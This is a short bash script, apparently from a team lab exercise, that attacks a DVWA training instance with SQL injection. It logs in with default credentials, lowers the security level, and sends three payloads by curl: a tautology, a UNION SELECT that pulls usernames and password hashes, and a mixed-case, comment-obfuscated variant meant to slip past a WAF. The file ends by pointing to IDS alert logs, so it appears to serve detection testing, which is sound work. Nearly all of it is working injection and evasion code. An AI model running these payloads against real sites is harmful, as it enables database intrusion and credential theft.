#!/bin/bash
# =============================================================================
#  payloads.sh — Equipe 6 — Round 1 (Injection SQL)
#
#  Usage :
#    bash attacks/equipe-6/payloads.sh <ip_dvwa>
#
#  Par defaut cible : dvwa (nom Docker)
# =============================================================================
TARGET="${1:-dvwa}"
PORT="80"
COOKIE_FILE="/tmp/dvwa_eq6.txt"

echo "=== Equipe 6 — Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# Authentification DVWA
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET:$PORT/login.php" -L -o /dev/null

# Forcer securite LOW
curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
  -d "security=low&seclev_submit=Submit" \
  "http://$TARGET:$PORT/security.php" -o /dev/null

echo "[*] Cookie recupere, niveau : low"
echo ""

# ── Payload 1 — Tautologie : confirmation de la vulnerabilite ───────────────
echo "[1] Payload basique — tautologie..."
RESULT=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=%27+OR+%271%27%3D%271&Submit=Submit" \
  -o /tmp/res1.html -w "%{http_code}")
echo "    HTTP $RESULT"
grep -o "First name:.*" /tmp/res1.html | head -3
echo ""

# ── Payload 2 — UNION SELECT : extraction users + hashes MD5 ────────────────
echo "[2] Payload avance — UNION SELECT..."
RESULT2=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit" \
  -o /tmp/res2.html -w "%{http_code}")
echo "    HTTP $RESULT2"
grep -o "First name:.*" /tmp/res2.html
echo ""

# ── Payload 3 — Evasion WAF : casse mixte + commentaires /**/ ───────────────
echo "[3] Payload evasion WAF..."
RESULT3=$(curl -s -b "$COOKIE_FILE" \
  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=%27%20UnIoN/**/SeLeCt/**/user,password/**/FrOm/**/users--+-&Submit=Submit" \
  -o /tmp/res3.html -w "%{http_code}")
echo "    HTTP $RESULT3"
grep -o "First name:.*" /tmp/res3.html
echo ""

echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
